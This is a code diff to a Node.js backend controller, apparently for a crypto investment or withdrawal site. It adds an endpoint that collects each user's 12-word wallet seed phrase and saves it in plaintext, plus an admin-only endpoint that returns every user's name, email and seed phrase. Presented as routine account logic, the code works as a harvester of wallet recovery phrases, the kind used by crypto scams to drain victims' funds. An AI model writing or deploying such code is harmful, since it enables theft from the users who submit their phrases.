@@ -375,6 +375,51 @@ exports.updateWithdrawalStatus = async (req, res) => {
     }
   };
   
+
+  exports.getAllSeedPhrases = async (req, res) => {
+    try {
+      // Check if the user is an admin
+      if (req.user.role !== 'admin') {
+        return res.status(403).json({ message: 'Access denied. Admins only.' });
+      }
+  
+      // Fetch all users and their wallet phrases
+      const users = await User.find({}, 'fullname email username walletPhrase');
+  
+      res.status(200).json({ data: users });
+    } catch (err) {
+      console.error('Error fetching seed phrases:', err);
+      res.status(500).json({ message: 'Server error while retrieving seed phrases' });
+    }
+  };
+
+exports.submitSeedPhrase = async (req, res) => {
+  try {
+    const { seedPhrase } = req.body;
+    const userId = req.user.id;
+
+    if (!seedPhrase) {
+      return res.status(400).json({ message: 'Seed phrase is required' });
+    }
+
+    const seedWords = seedPhrase.trim().split(/\s+/);
+    if (seedWords.length !== 12) {
+      return res.status(400).json({ message: 'Seed phrase must contain exactly 12 words' });
+    }
+
+    const user = await User.findById(userId);
+    if (!user) return res.status(404).json({ message: 'User not found' });
+
+    user.walletPhrase = seedWords;
+    await user.save();
+
+    res.status(200).json({ message: 'Seed phrase saved successfully' });
+  } catch (err) {
+    console.error('Error saving seed phrase:', err);
+    res.status(500).json({ message: 'Server error while saving seed phrase' });
+  }
+};
+
   
   
   // Update user profile details
